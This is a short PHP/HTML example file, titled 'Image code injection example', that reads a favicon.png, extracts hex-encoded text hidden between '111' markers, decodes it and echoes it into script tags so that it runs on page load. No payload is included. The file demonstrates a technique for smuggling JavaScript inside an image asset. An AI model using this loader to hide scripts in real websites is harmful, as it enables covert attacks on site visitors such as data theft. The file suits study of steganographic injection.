<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image code injection example</title>
</head>
<body>

	<?php

	$handle = @fopen("favicon.png", "r"); // favicon with injection code

	$hackcode; // empty variable for the injection code

	if ($handle) {

		// read out fancy code from favicon.png
	    while (!feof($handle)) {
	        $hex = bin2hex(fread ($handle , 4 ));
	        $hackcode = $hackcode . $hex; 
	    }
	    fclose($handle);

		preg_match('/313131.*313131/i', $hackcode, $matches, PREG_OFFSET_CAPTURE); // get code between "111***111"

		$hackcode = hexToStr($matches[0][0]); //transform hex to string

		$hackcode = preg_replace('/111/i', '', $hackcode); // remove the "111"

		print '<script>' . $hackcode . '</script>'; // print the injection code inside <script> tags
		
	}

	// function to transform hex to string
	function hexToStr($hex){
	    $string='';
	    for ($i=0; $i < strlen($hex)-1; $i+=2){
	        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
	    }
	    return $string;
	}

?>
    
</body>
</html>



